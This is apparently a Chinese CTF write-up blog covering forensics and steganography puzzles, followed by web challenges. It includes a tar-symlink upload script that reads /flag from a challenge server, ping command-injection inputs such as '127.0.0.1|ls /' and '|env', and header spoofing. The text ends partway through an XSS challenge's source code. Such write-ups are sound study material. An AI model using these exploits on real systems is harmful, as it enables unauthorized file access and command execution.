提一句：这个工具可以爆破，但是由于前面提取就不是按顺序，所以把爆破后拼接顺序也不对，其实可以让gpt将这些crc碰撞的值按文件顺序拼接就可以得到正确的结果。 但是这个工具只能4字节以下，但是crc爆破范围是18字节以下，如果遇到其实也只需要找脚本把文件的crc提取出来再用上面的脚本就好了，这个工具纯省力，运气好梭哈。 当然这里偷了一个大佬的脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 from binascii import crc32 import string import zipfile dic=string.printable def CrackCrc(crc): for i in dic : # print (i) for j in dic: for p in dic: for q in dic: s=i+j+p+q # print (crc32(bytes(s,\u0026#39;ascii\u0026#39;)) \u0026amp; 0xffffffff) if crc == (crc32(bytes(s,\u0026#39;ascii\u0026#39;)) \u0026amp; 0xffffffff): print (s) return def getcrc32(fname): l=[] file = fname f = zipfile.ZipFile(file, \u0026#39;r\u0026#39;) global fileList fileList =f.namelist () print (fileList) # print (type(fileList)) for filename in fileList: Fileinfo = f.getinfo(filename) # print(Fileinfo) crc = Fileinfo.CRC # print (\u0026#39;crc\u0026#39;,crc) l.append(crc) return l def main (filename=None): l = getcrc32(filename) # print(l) for i in range(len(l)): print(fileList[i], end=\u0026#39;的内容是:\u0026#39;) CrackCrc(l[i]) if __name__ == \u0026#34;__main__\u0026#34;: main (\u0026#39;test.zip\u0026#39;) 运行python crc32.py即可，这个更慢，但是没什么字节限制\n爆破之后就是解密了\n这题套题有点难受：伪加密+补全残缺png+crc爆破+our Secret解密\nUSB CTF中我的USB键盘鼠标流量解密指南和脚本 - FreeBuf网络安全行业门户\nCTF \u0026ndash; CTF中我的USB键盘鼠标流量解密指南和脚本\nUSB - 流量分析 - 流量 | nnnpc\u0026rsquo;s Blog = 低头学习 抬头看路 = 很多人已经做到了，而他们都曾经和现在的你站在同样的起点上\n先去kali执行命令提取数据\n1 tshark -r flag.pcap -T fields -e usbhid.data | sed \u0026#39;/^\\s*$/d\u0026#39; \u0026gt; data.txt 然后写代码解密即可\n本来想用上面文章的工具，但是脚本还需要根据实际情况修改，所以索性直接gpt写脚本处理提取出来的data.txt\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 # 自定义 HID 映射表（十六进制小写字符串作为键） hid_keymap = { \u0026#34;04\u0026#34;: \u0026#34;a\u0026#34;, \u0026#34;05\u0026#34;: \u0026#34;b\u0026#34;, \u0026#34;06\u0026#34;: \u0026#34;c\u0026#34;, \u0026#34;07\u0026#34;: \u0026#34;d\u0026#34;, \u0026#34;08\u0026#34;: \u0026#34;e\u0026#34;, \u0026#34;09\u0026#34;: \u0026#34;f\u0026#34;, \u0026#34;0a\u0026#34;: \u0026#34;g\u0026#34;, \u0026#34;0b\u0026#34;: \u0026#34;h\u0026#34;, \u0026#34;0c\u0026#34;: \u0026#34;i\u0026#34;, \u0026#34;0d\u0026#34;: \u0026#34;j\u0026#34;, \u0026#34;0e\u0026#34;: \u0026#34;k\u0026#34;, \u0026#34;0f\u0026#34;: \u0026#34;l\u0026#34;, \u0026#34;10\u0026#34;: \u0026#34;m\u0026#34;, \u0026#34;11\u0026#34;: \u0026#34;n\u0026#34;, \u0026#34;12\u0026#34;: \u0026#34;o\u0026#34;, \u0026#34;13\u0026#34;: \u0026#34;p\u0026#34;, \u0026#34;14\u0026#34;: \u0026#34;q\u0026#34;, \u0026#34;15\u0026#34;: \u0026#34;r\u0026#34;, \u0026#34;16\u0026#34;: \u0026#34;s\u0026#34;, \u0026#34;17\u0026#34;: \u0026#34;t\u0026#34;, \u0026#34;18\u0026#34;: \u0026#34;u\u0026#34;, \u0026#34;19\u0026#34;: \u0026#34;v\u0026#34;, \u0026#34;1a\u0026#34;: \u0026#34;w\u0026#34;, \u0026#34;1b\u0026#34;: \u0026#34;x\u0026#34;, \u0026#34;1c\u0026#34;: \u0026#34;y\u0026#34;, \u0026#34;1d\u0026#34;: \u0026#34;z\u0026#34;, \u0026#34;1e\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;1f\u0026#34;: \u0026#34;2\u0026#34;, \u0026#34;20\u0026#34;: \u0026#34;3\u0026#34;, \u0026#34;21\u0026#34;: \u0026#34;4\u0026#34;, \u0026#34;22\u0026#34;: \u0026#34;5\u0026#34;, \u0026#34;23\u0026#34;: \u0026#34;6\u0026#34;, \u0026#34;24\u0026#34;: \u0026#34;7\u0026#34;, \u0026#34;25\u0026#34;: \u0026#34;8\u0026#34;, \u0026#34;26\u0026#34;: \u0026#34;9\u0026#34;, \u0026#34;27\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;28\u0026#34;: \u0026#34;\u0026lt;RET\u0026gt;\u0026#34;, \u0026#34;29\u0026#34;: \u0026#34;\u0026lt;ESC\u0026gt;\u0026#34;, \u0026#34;2a\u0026#34;: \u0026#34;\u0026lt;DEL\u0026gt;\u0026#34;, \u0026#34;2b\u0026#34;: \u0026#34;\\t\u0026#34;, \u0026#34;2c\u0026#34;: \u0026#34;\u0026lt;SPACE\u0026gt;\u0026#34;, \u0026#34;2d\u0026#34;: \u0026#34;-\u0026#34;, \u0026#34;2e\u0026#34;: \u0026#34;=\u0026#34;, \u0026#34;2f\u0026#34;: \u0026#34;[\u0026#34;, \u0026#34;30\u0026#34;: \u0026#34;]\u0026#34;, \u0026#34;31\u0026#34;: \u0026#34;\\\\\u0026#34;, \u0026#34;32\u0026#34;: \u0026#34;\u0026lt;NON\u0026gt;\u0026#34;, \u0026#34;33\u0026#34;: \u0026#34;;\u0026#34;, \u0026#34;34\u0026#34;: \u0026#34;\u0026#39;\u0026#34;, \u0026#34;35\u0026#34;: \u0026#34;\u0026lt;GA\u0026gt;\u0026#34;, \u0026#34;36\u0026#34;: \u0026#34;,\u0026#34;, \u0026#34;37\u0026#34;: \u0026#34;.\u0026#34;, \u0026#34;38\u0026#34;: \u0026#34;/\u0026#34;, \u0026#34;39\u0026#34;: \u0026#34;\u0026lt;CAP\u0026gt;\u0026#34;, \u0026#34;3a\u0026#34;: \u0026#34;\u0026lt;F1\u0026gt;\u0026#34;, \u0026#34;3b\u0026#34;: \u0026#34;\u0026lt;F2\u0026gt;\u0026#34;, \u0026#34;3c\u0026#34;: \u0026#34;\u0026lt;F3\u0026gt;\u0026#34;, \u0026#34;3d\u0026#34;: \u0026#34;\u0026lt;F4\u0026gt;\u0026#34;, \u0026#34;3e\u0026#34;: \u0026#34;\u0026lt;F5\u0026gt;\u0026#34;, \u0026#34;3f\u0026#34;: \u0026#34;\u0026lt;F6\u0026gt;\u0026#34;, \u0026#34;40\u0026#34;: \u0026#34;\u0026lt;F7\u0026gt;\u0026#34;, \u0026#34;41\u0026#34;: \u0026#34;\u0026lt;F8\u0026gt;\u0026#34;, \u0026#34;42\u0026#34;: \u0026#34;\u0026lt;F9\u0026gt;\u0026#34;, \u0026#34;43\u0026#34;: \u0026#34;\u0026lt;F10\u0026gt;\u0026#34;, \u0026#34;44\u0026#34;: \u0026#34;\u0026lt;F11\u0026gt;\u0026#34;, \u0026#34;45\u0026#34;: \u0026#34;\u0026lt;F12\u0026gt;\u0026#34;, \u0026#34;46\u0026#34;: \u0026#34;\u0026lt;PRTSC\u0026gt;\u0026#34;, \u0026#34;47\u0026#34;: \u0026#34;\u0026lt;SCRLK\u0026gt;\u0026#34;, \u0026#34;48\u0026#34;: \u0026#34;\u0026lt;PAUSE\u0026gt;\u0026#34;, \u0026#34;49\u0026#34;: \u0026#34;\u0026lt;INS\u0026gt;\u0026#34;, \u0026#34;4a\u0026#34;: \u0026#34;\u0026lt;HOME\u0026gt;\u0026#34;, \u0026#34;4b\u0026#34;: \u0026#34;\u0026lt;PGUP\u0026gt;\u0026#34;, \u0026#34;4c\u0026#34;: \u0026#34;\u0026lt;DEL_FWD\u0026gt;\u0026#34;, \u0026#34;4d\u0026#34;: \u0026#34;\u0026lt;END\u0026gt;\u0026#34;, \u0026#34;4e\u0026#34;: \u0026#34;\u0026lt;PGDN\u0026gt;\u0026#34;, \u0026#34;4f\u0026#34;: \u0026#34;\u0026lt;RIGHT\u0026gt;\u0026#34;, \u0026#34;50\u0026#34;: \u0026#34;\u0026lt;LEFT\u0026gt;\u0026#34;, \u0026#34;51\u0026#34;: \u0026#34;\u0026lt;DOWN\u0026gt;\u0026#34;, \u0026#34;52\u0026#34;: \u0026#34;\u0026lt;UP\u0026gt;\u0026#34;, \u0026#34;53\u0026#34;: \u0026#34;\u0026lt;NUMLOCK\u0026gt;\u0026#34;, \u0026#34;54\u0026#34;: \u0026#34;/\u0026#34;, \u0026#34;55\u0026#34;: \u0026#34;*\u0026#34;, \u0026#34;56\u0026#34;: \u0026#34;-\u0026#34;, \u0026#34;57\u0026#34;: \u0026#34;+\u0026#34;, \u0026#34;58\u0026#34;: \u0026#34;\u0026lt;ENTER\u0026gt;\u0026#34;, \u0026#34;59\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;5a\u0026#34;: \u0026#34;2\u0026#34;, \u0026#34;5b\u0026#34;: \u0026#34;3\u0026#34;, \u0026#34;5c\u0026#34;: \u0026#34;4\u0026#34;, \u0026#34;5d\u0026#34;: \u0026#34;5\u0026#34;, \u0026#34;5e\u0026#34;: \u0026#34;6\u0026#34;, \u0026#34;5f\u0026#34;: \u0026#34;7\u0026#34;, \u0026#34;60\u0026#34;: \u0026#34;8\u0026#34;, \u0026#34;61\u0026#34;: \u0026#34;9\u0026#34;, \u0026#34;62\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;63\u0026#34;: \u0026#34;.\u0026#34;, \u0026#34;64\u0026#34;: \u0026#34;\u0026lt;NONUS_BACK\u0026gt;\u0026#34;, \u0026#34;65\u0026#34;: \u0026#34;\u0026lt;APP\u0026gt;\u0026#34;, \u0026#34;66\u0026#34;: \u0026#34;\u0026lt;POWER\u0026gt;\u0026#34;, \u0026#34;67\u0026#34;: \u0026#34;=\u0026#34;, \u0026#34;68\u0026#34;: \u0026#34;\u0026lt;F13\u0026gt;\u0026#34;, \u0026#34;69\u0026#34;: \u0026#34;\u0026lt;F14\u0026gt;\u0026#34;, \u0026#34;6a\u0026#34;: \u0026#34;\u0026lt;F15\u0026gt;\u0026#34;, \u0026#34;6b\u0026#34;: \u0026#34;\u0026lt;F16\u0026gt;\u0026#34;, \u0026#34;6c\u0026#34;: \u0026#34;\u0026lt;F17\u0026gt;\u0026#34;, \u0026#34;6d\u0026#34;: \u0026#34;\u0026lt;F18\u0026gt;\u0026#34;, \u0026#34;6e\u0026#34;: \u0026#34;\u0026lt;F19\u0026gt;\u0026#34;, \u0026#34;6f\u0026#34;: \u0026#34;\u0026lt;F20\u0026gt;\u0026#34;, \u0026#34;70\u0026#34;: \u0026#34;\u0026lt;F21\u0026gt;\u0026#34;, \u0026#34;71\u0026#34;: \u0026#34;\u0026lt;F22\u0026gt;\u0026#34;, \u0026#34;72\u0026#34;: \u0026#34;\u0026lt;F23\u0026gt;\u0026#34;, \u0026#34;73\u0026#34;: \u0026#34;\u0026lt;F24\u0026gt;\u0026#34; } # 加载 USB HID 数据文件 input_file = \u0026#34;1.txt\u0026#34; # 替换为你的实际路径 with open(input_file, \u0026#34;r\u0026#34;) as f: lines = f.read().splitlines() # 解析数据并还原按键 keystrokes = [] for line in lines: if len(line) \u0026gt;= 8: hex_code = line[6:8].lower() key = hid_keymap.get(hex_code, \u0026#39;\u0026#39;) keystrokes.append(key) # 输出完整的按键还原结果（包括控制符号） reconstructed_text = \u0026#39;\u0026#39;.join(keystrokes) print(reconstructed_text) 当然上面的3篇文章也讲述了鼠标流量。这里代码参考UCSCCTF2025 - Misc - WriteUp|2hi5hu-研习足迹\nNo.shArk 先把所有可疑文件全部dump出来\n经过分析，发现可疑文件cat.png（010打开发现key）\npng末尾有keyis:keykeyishere，不知道啥用先放这\ndns协议隐写 这时候发现有些流量包含有大量01数据，显然很可疑\n根据流量地址用tshark导出\n1 tshark -r complete.pcapng -T fields -e dns.qry.name -Y \u0026#39; ip.dst == 114.114.114.114\u0026#39; | sed \u0026#39;/^\\s*$/d\u0026#39; | uniq \u0026gt; data.txt 去除无用数据，放到010文本编辑器\n乍一看不就是二维码嘛，直接写代码转换为二维码（由于这个数据有25行，51列，所以横向2字符一像素）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 from PIL import Image import numpy as np # 原始数据 data_str = \u0026#34;\u0026#34;\u0026#34; 11111111111111001100000000001100110000000000000000 11000000000011001100001111111100000000000000000000 11001111110011001111000011000011110000000000000000 11001111110011001111110011000000110000000000000000 11001111110011000011110011001100110000000000000000 11000000000011001111110000000000110000000000000000 11111111111111001100110011001100110000000000000000 00000000000000000000111100110011110000000000000000 11110000111111000000110011110000000000110011111111 00001111111100001100000000111111110011001111001111 11110011000011001111110000000011001111111100110000 00001100001100000011000011001111110000111100111100 11001100111111000000001100111100001111001111000011 11000000001100111111110011000011111100001111111100 00000000000011000011001111111111110000000000001100 00000000000000001111111100110011111100110000110000 11111111001111001100000011110000111111111100000000 00000000000000001100000000111100110000001111001111 00000000000000000000110000000011110011001111000000 00000000000000001100000011001100110000001100111111 00000000000000001111111100111100111111111100110011 00000000000000000011110011000011001111110000111111 00000000000000000011001111111111111100110000111100 00000000000000001111111100110011001111000011111100 00000000000000001100000011110011000011110011111111 \u0026#34;\u0026#34;\u0026#34; # 解析数据 lines = data_str.strip().split(\u0026#39;\\n\u0026#39;) height = len(lines) width = len(lines[0]) // 2 # 每两个字符表示一个像素 # 创建图像数组 image_array = np.zeros((height, width), dtype=np.uint8) for y, line in enumerate(lines): for x in range(0, len(line), 2): pixel = line[x:x + 2] if pixel == \u0026#39;11\u0026#39;: image_array[y, x // 2] = 0 # 黑色 elif pixel == \u0026#39;00\u0026#39;: image_array[y, x // 2] = 255 # 白色 # 创建图像 img = Image.fromarray(image_array, mode=\u0026#39;L\u0026#39;) img = img.resize((width * 10, height * 10), resample=Image.NEAREST) img.save(\u0026#34;output_image.png\u0026#34;) img.show() 但是少了2个定位符，直接上ps，将左上的定位符ps上去\n微信扫码得到Y0U_Fi8d_ItHa@aaHH（微信识别二维码功能很强，我ps技术不好很多二维码识别工具都不好识别，但是微信可以）\nsnow隐写 然后发现w1.html也很可疑，发现其数据里有大量制表符。\n刚好符合snow隐写\n然后snow解密得到一半flag。但是前面的key试了不对，所以试这个二维码扫出的值，\n1 snow.exe -C -p password filename 11ef-b3b6-a4b1c1c5a2d2}\njpg silenteye隐写 但是我们从FTP-DATA导出来一jpg，还一个密钥没用，所以这里想到考关于jpg隐写，尝试一番想到silenteye，密码是前面的key，得到3个字符与其值\nshuffle=5,a=7,b=3\nArnold猫脸变换 这里由这些参数和cat.png与宽高大小相等可以想到猫脸变换（变换后图像变成了像白噪声一样无意义的图像，符合图像。并且其只要确定shuffle,a,b这三个参数即可还原图片）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 import matplotlib.pyplot as plt import cv2 import numpy as np from PIL import Image img = cv2.imread(\u0026#39;cat.png\u0026#39;) def arnold_encode(image, shuffle_times, a, b): arnold_image = np.zeros(shape=image.shape) h, w = image.shape[0], image.shape[1] N = h # 或N=w for time in range(shuffle_times): for ori_x in range(h): for ori_y in range(w): new_x = (1 * ori_x + b * ori_y) % N new_y = (a * ori_x + (a * b + 1) * ori_y) % N arnold_image[new_x, new_y, :] = image[ori_x, ori_y, :] image = np.copy(arnold_image) cv2.imwrite(\u0026#39;flag_arnold_encode.png\u0026#39;, arnold_image, [int(cv2.IMWRITE_PNG_COMPRESSION), 0]) return arnold_image def arnold_decode(image, shuffle_times, a, b): decode_image = np.zeros(shape=image.shape) h, w = image.shape[0], image.shape[1] N = h # 或N=w for time in range(shuffle_times): for ori_x in range(h): for ori_y in range(w): new_x = ((a * b + 1) * ori_x + (-b) * ori_y) % N new_y = ((-a) * ori_x + ori_y) % N decode_image[new_x, new_y, :] = image[ori_x, ori_y, :] cv2.imwrite(\u0026#39;flag.png\u0026#39;, decode_image, [int(cv2.IMWRITE_PNG_COMPRESSION), 0]) return decode_image # arnold_encode(img, 1, 2, 3) arnold_decode(img, 5, 7, 3) 当然其实什么参数不知道也行，直接爆破参数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 import matplotlib.pyplot as plt import cv2 import numpy as np def arnold_decode(image, shuffle_times, a, b): decode_image = np.zeros(shape=image.shape) h, w = image.shape[0], image.shape[1] N = h # 或N=w for time in range(shuffle_times): for ori_x in range(h): for ori_y in range(w): # 按照公式坐标变换 new_x = ((a * b + 1) * ori_x + (-b) * ori_y) % N new_y = ((-a) * ori_x + ori_y) % N decode_image[new_x, new_y, :] = image[ori_x, ori_y, :] image = np.copy(decode_image) return image def arnold_brute(image,shuffle_times_range,a_range,b_range): for c in range(shuffle_times_range[0],shuffle_times_range[1]): for a in range(a_range[0],a_range[1]): for b in range(b_range[0],b_range[1]): print(f\u0026#34;[+] Trying shuffle_times={c} a={a} b={b}\u0026#34;) decoded_img = arnold_decode(image,c,a,b) output_filename = f\u0026#34;flag_decodedc{c}_a{a}_b{b}.png\u0026#34; cv2.imwrite(output_filename, decoded_img, [int(cv2.IMWRITE_PNG_COMPRESSION), 0]) if __name__ == \u0026#34;__main__\u0026#34;: img = cv2.imread(\u0026#34;download.png\u0026#34;) arnold_brute(img, (1,6), (1,11), (1,11)) 考的很多，dns隐写+snow隐写+silenteye隐写+猫脸变换，甚至还考一点二维码，很难了\n参考：\n2025 UCSCCTF Misc Writeup - ⚡Lunatic BLOG⚡\nUCSCCTF2025 - Misc - WriteUp|2hi5hu-研习足迹\n猫映射（Arnold变换），猫脸变换介绍与基于例题脚本的爆破 - Alexander17 - 博客园\narnold cat 变换 (猫脸变换) | 独奏の小屋\n","date":"2025-04-20T00:00:00Z","permalink":"https://luo-kaihong.github.io/p/2025-ucsc-ctf/","title":"2025-UCSC-CTF"},{"content":" 4.18 [[NSSRound#6 Team]check\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 # -*- coding: utf-8 -*- from flask import Flask, request import tarfile import os app = Flask(__name__) app.config[\u0026#39;UPLOAD_FOLDER\u0026#39;] = \u0026#39;./uploads\u0026#39; # 设置文件上传的目标文件夹为当前目录下的 uploads 文件夹 app.config[\u0026#39;MAX_CONTENT_LENGTH\u0026#39;] = 100 * 1024 # 设置允许上传的最大文件大小为 100KB，防止上传过大文件导致服务器资源耗尽 ALLOWED_EXTENSIONS = set([\u0026#39;tar\u0026#39;]) # 定义允许上传的文件扩展名集合，这里只允许 tar 格式的文件 def allowed_file(filename): # 判断给定的文件名是否符合要求：文件名中包含 \u0026#39;.\u0026#39; 且文件扩展名在 ALLOWED_EXTENSIONS 集合中 return \u0026#39;.\u0026#39; in filename and \\ filename.rsplit(\u0026#39;.\u0026#39;, 1)[1].lower() in ALLOWED_EXTENSIONS @app.route(\u0026#39;/\u0026#39;) def index(): # 当客户端访问应用根路径时，打开当前文件（即这个 Python 脚本文件），读取其内容并返回给客户端 # 通常用于展示应用的基本信息或简单的欢迎页面 with open(__file__, \u0026#39;r\u0026#39;) as f: return f.read() @app.route(\u0026#39;/upload\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def upload_file(): # 处理文件上传请求的路由，只接受 POST 方法 if \u0026#39;file\u0026#39; not in request.files: # 检查客户端的请求中是否包含名为 \u0026#39;file\u0026#39; 的文件数据，如果不包含，返回 \u0026#39;?\u0026#39; 表示请求格式错误 return \u0026#39;?\u0026#39; file = request.files[\u0026#39;file\u0026#39;] # 从请求中获取名为 \u0026#39;file\u0026#39; 的文件对象 if file.filename == \u0026#39;\u0026#39;: # 检查获取到的文件对象的文件名是否为空字符串，如果是，返回 \u0026#39;?\u0026#39; 表示请求中没有有效的文件 return \u0026#39;?\u0026#39; print(file.filename) # 打印文件名，用于调试或记录上传文件的信息 # 综合判断文件对象是否有效、文件名是否符合要求： # 通过 allowed_file 函数检查扩展名，同时检查文件名中是否包含 \u0026#39;..\u0026#39; 或 \u0026#39;/\u0026#39;，防止路径遍历攻击 if file and allowed_file(file.filename) and \u0026#39;..\u0026#39; not in file.filename and \u0026#39;/\u0026#39; not in file.filename: file_save_path = os.path.join(app.config[\u0026#39;UPLOAD_FOLDER\u0026#39;], file.filename) # 构造文件保存路径 if os.path.exists(file_save_path): # 检查构造的文件保存路径是否已经存在文件，如果存在，返回提示信息，表示文件已存在，拒绝重复上传 return \u0026#39;This file already exists\u0026#39; file.save(file_save_path) # 将上传的文件保存到指定的文件保存路径 else: # 如果文件不符合要求（类型不对或文件名包含非法字符），返回相应的错误信息 return \u0026#39;This file is not a tarfile\u0026#39; try: tar = tarfile.open(file_save_path, \u0026#34;r\u0026#34;) # 尝试打开保存的 tar 文件 tar.extractall(app.config[\u0026#39;UPLOAD_FOLDER\u0026#39;]) # 将 tar 文件内容解压到上传文件夹 except Exception as e: # 捕获解压过程中可能出现的异常，并将异常信息返回给客户端 # 这是为了处理解压失败的情况，比如文件损坏或不是有效的 tar 文件 return str(e) os.remove(file_save_path) # 解压完成后，删除原始的 tar 文件，节省存储空间 return \u0026#39;success\u0026#39; # 如果整个上传和处理流程成功完成，返回 \u0026#39;success\u0026#39; 表示操作成功 @app.route(\u0026#39;/download\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def download_file(): # 处理文件下载请求的路由，只接受 POST 方法 filename = request.form.get(\u0026#39;filename\u0026#39;) # 从请求表单数据中获取名为 \u0026#39;filename\u0026#39; 的参数值，即客户端想要下载的文件名 if filename is None or filename == \u0026#39;\u0026#39;: # 检查获取到的文件名是否为空或 None，如果是，返回 \u0026#39;?\u0026#39; 表示请求参数错误 return \u0026#39;?\u0026#39; filepath = os.path.join(app.config[\u0026#39;UPLOAD_FOLDER\u0026#39;], filename) # 构造文件路径 # 检查文件名中是否包含 \u0026#39;..\u0026#39; 或 \u0026#39;/\u0026#39;，防止路径遍历攻击 # 这是为了确保只能下载上传文件夹中的文件，不能访问其他目录的文件 if \u0026#39;..\u0026#39; in filename or \u0026#39;/\u0026#39; in filename: return \u0026#39;?\u0026#39; # 检查构造的文件路径是否存在且是一个文件，如果不是，返回 \u0026#39;?\u0026#39; 表示文件不存在或路径错误 if not os.path.exists(filepath) or not os.path.isfile(filepath): return \u0026#39;?\u0026#39; # 打开文件并读取其内容，将内容返回给客户端 # 这是实现文件下载的核心逻辑，客户端会收到文件内容并可能保存为文件 with open(filepath, \u0026#39;r\u0026#39;) as f: return f.read() @app.route(\u0026#39;/clean\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def clean_file(): # 处理清理操作的路由，只接受 POST 方法 # 调用 os.system 执行 \u0026#39;/tmp/clean.sh\u0026#39; 脚本，然后返回 \u0026#39;success\u0026#39; # 这里存在命令注入的安全风险，因为直接执行外部脚本，如果脚本路径或内容被篡改，可能会导致服务器被攻击 os.system(\u0026#39;/tmp/clean.sh\u0026#39;) return \u0026#39;success\u0026#39; if __name__ == \u0026#39;__main__\u0026#39;: # 判断当前模块是否作为主程序运行 # 如果是，启动 Flask 应用，监听所有网络接口（host=\u0026#39;0.0.0.0\u0026#39;），开启调试模式（debug=True），使用 80 端口（port=80） # 这使得应用可以在网络上的任何设备访问，并且调试模式会提供更详细的错误信息，方便开发调试 # 但在生产环境中通常应关闭调试模式 app.run(host=\u0026#39;0.0.0.0\u0026#39;, debug=True, port=80) 1 可以进行文件的上传与下载，同时限制了文件只能是tar文件，并对文件名进行了过滤，禁止了…和/符号。 漏洞点如下\n1 2 3 4 5 tar = tarfile.open(file_save_path, \u0026#34;r\u0026#34;) tar.extractall(app.config[\u0026#39;UPLOAD_FOLDER\u0026#39;]) #这段代码存在文件路径注入漏洞 #文件路径注入：如果file_save_path变量的值是通过用户输入或其他不可信的来源获取的，存在路径注入的风险。攻击者可以通过构造恶意的路径来访问系统中的其他文件或目录。 打内容软连接 1 通过上传一个tar文件，文件里面的内容软连接指向/flag，tar被解压后里面的文件指向了flag的内容，然后通过download函数将文件下载出来即可得到flag 首先liunx环境执行\n1 2 ln -s /flag flag tar -cvf flag.tar flag 然后上传flag.tar，然后下载flag就行，这里直接上代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import requests as req url = \u0026#34;http://node5.anna.nssctf.cn:29574/\u0026#34; filename = r\u0026#34;flag.tar\u0026#34; #这里的文件名是绝对路径 def upload(url, fileName): url = url + \u0026#34;upload\u0026#34; file = {\u0026#34;file\u0026#34;: open(fileName, \u0026#39;rb\u0026#39;)} response = req.post(url=url, files=file) print(response.text) def download(url): url = url + \u0026#34;download\u0026#34; file = {\u0026#34;filename\u0026#34;: \u0026#34;flag\u0026#34;} response = req.post(url, data=file) print(response.text) if __name__ == \u0026#34;__main__\u0026#34;: upload(url, filename) download(url) 本题还有一个升级版，CVE-2007-4559漏洞，可以通过tar.extractall()函数的漏洞，解压文件时候，覆盖掉目录中的文件\n[NSSRound#6 Team]Web学习_[nssround#6 team]check(revenge)-CSDN博客\n4.19 [HZNUCTF 2023 preliminary]guessguessguess\n看似sql,其实考ping 此题很古怪，打1，2，3进去有回显但是没啥用，打sql注入发现字符反转，但是我将payload反转后还是执行不了，但是这里发现hint，所以试着打了一个hint进去（要反转）\n有了提示\n提示说有命令执行，打打试试，直接上去就打phpinfo（反转后是ofniphp），执行成功！，搜索flag即可找到\n既然可以命令执行，那么肯定是有其它方法，直接打system(\u0026rsquo;ls /\u0026rsquo;);没反应，这时候想到了ping，试试？打个127.0.0.1|ls /试试，有反应！但是没看到flag，那直接猜在环境里面\n打个127.0.0.1|env，果然flag在环境里\n网上找了源码，很脑洞此题\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \u0026lt;?php $userArr = array(\u0026#34;username: admin\u0026lt;br\u0026gt;password: admin\u0026#34;,\u0026#34;username: docker\u0026lt;br\u0026gt;password: docker\u0026#34;, \u0026#34;username: mxx307\u0026lt;br\u0026gt;password: mxxxxxxx3333000777\u0026#34;, \u0026#34;username: FLAG_IN_HERE\u0026lt;br\u0026gt;password: 不给你看\u0026#34;); $cmd = strrev($_POST[\u0026#39;cmd\u0026#39;]); if($cmd != \u0026#39;hint\u0026#39; \u0026amp;\u0026amp; $cmd != \u0026#39;phpinfo\u0026#39;){ echo \u0026#34;your SQL: SELECT * FROM users WHERE id=$cmd\u0026#34;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } if($cmd == \u0026#34;phpinfo\u0026#34;) { eval(\u0026#39;phpinfo();\u0026#39;); } else if(preg_match(\u0026#39;/127.0.0.1/\u0026#39;,$cmd) \u0026amp;\u0026amp; !preg_match(\u0026#39;/;|\u0026amp;/\u0026#39;,$cmd )) { system(\u0026#39;ping \u0026#39;.$cmd); } else if($cmd == \u0026#34;hint\u0026#34;) { echo \u0026#39;可爱的CTFer哟,你掉的是这个金\u0026#34;命令执行\u0026#34;,还是这个银\u0026#34;XSS\u0026#34;还是这个普通的\u0026#34;SQL注入\u0026#34;呢?\u0026#39;; }else if(preg_match(\u0026#39;/^\\d$/\u0026#39;,$cmd, $matches)) { if($matches[0] \u0026lt;= 4 \u0026amp;\u0026amp; $matches[0] \u0026gt;= 1){ echo $userArr[$matches[0] - 1]; } else { echo \u0026#34;no user\u0026#34;; } }else { echo \u0026#34;猜猜猜\u0026#34;; } 4.20 [SWPUCTF 2021 新生赛]Do_you_know_http\n上来一个UA伪造\n访问a.php\n一看本地伪造X-Forwarded-For:127.0.0.1\n访问/secretttt.php即可得flag\n4.21 多路由跳转XXS Designer\n题目给了源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 const express = require(\u0026#34;express\u0026#34;) // 引入Express框架，用于创建Web服务器 const jwt = require(\u0026#34;jsonwebtoken\u0026#34;) // 引入jsonwebtoken库，用于生成和验证JWT令牌 const puppeteer = require(\u0026#39;puppeteer\u0026#39;) // 引入Puppeteer库，用于无头浏览器操作 const querystring = require(\u0026#39;node:querystring\u0026#39;) // 引入查询字符串处理模块 const app = express() // 创建Express应用实例 // 配置中间件和视图引擎 app.use(express.static(\u0026#34;./static\u0026#34;)) // 设置静态文件目录为./static app.use(express.json()) // 解析JSON格式的请求体 app.set(\u0026#34;view engine\u0026#34;, \u0026#34;ejs\u0026#34;) // 设置视图引擎为EJS app.set(\u0026#34;views\u0026#34;, \u0026#34;views\u0026#34;) // 设置视图文件存放目录 app.use(express.urlencoded({ extended: false })) // 解析URL编码的请求体 const secret = \u0026#34;secret_here\u0026#34; // 